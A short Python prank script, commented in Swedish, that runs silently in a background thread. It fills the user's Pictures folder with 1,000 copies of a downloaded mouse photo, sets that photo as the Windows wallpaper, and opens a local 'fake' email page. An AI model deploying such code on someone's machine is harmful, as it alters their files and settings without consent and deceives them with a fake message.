import webbrowser
import os
import urllib.request
import threading
import shutil

script_dir = os.path.dirname(os.path.abspath(__file__))

mouse_urls = [
    "https://upload.wikimedia.org/wikipedia/commons/thumb/9/9e/Mouse_cursors_-_transparent_background.png/240px-Mouse_cursors_-_transparent_background.png",
    "https://upload.wikimedia.org/wikipedia/commons/thumb/2/26/YellowLabradorLooking_new.jpg/1200px-YellowLabradorLooking_new.jpg",
    "https://upload.wikimedia.org/wikipedia/commons/a/a7/Camponotus_flavomarginatus_ant.jpg",
]

# Faktiskt en mus (djuret)
mouse_url = "https://upload.wikimedia.org/wikipedia/commons/thumb/5/5d/Murano_mouse.jpg/320px-Murano_mouse.jpg"

def download_images():
    pictures_dir = os.path.join(os.path.expanduser("~"), "Pictures")
    
    # Ladda ner musbilden
    base_path = os.path.join(pictures_dir, "mus_base.jpg")
    try:
        urllib.request.urlretrieve(mouse_url, base_path)
    except:
        return

    # Kopiera 1000 gånger
    for i in range(1, 1001):
        dst = os.path.join(pictures_dir, f"mus_{i:04d}.jpg")
        try:
            shutil.copy(base_path, dst)
        except:
            pass

    # Byt bakgrund till musen
    try:
        import ctypes
        ctypes.windll.user32.SystemParametersInfoW(20, 0, base_path, 3)
    except:
        pass

t = threading.Thread(target=download_images)
t.daemon = True
t.start()

# Öppna fake-mailet
mail_path = os.path.join(script_dir, "download_done.html")
webbrowser.open("file:///" + mail_path.replace("\\", "/"))
